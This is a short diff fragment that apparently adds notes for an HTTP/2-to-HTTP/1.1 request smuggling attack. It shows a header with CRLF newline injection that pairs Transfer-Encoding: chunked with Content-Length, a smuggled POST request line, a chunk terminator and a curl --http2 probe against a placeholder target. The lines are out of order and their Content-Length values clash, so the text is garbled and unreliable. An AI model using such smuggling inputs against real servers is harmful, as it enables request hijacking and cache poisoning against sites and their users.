@@ -1,0 +1,6 @@
+. Back sees CL=3, reads only
+0\r\n\r\n
+:path /
+POST / HTTP/1.1
+Transfer-Encoding: chunked\r\nContent-Length: 6   # newline injection
+curl --http2 -I https://target/
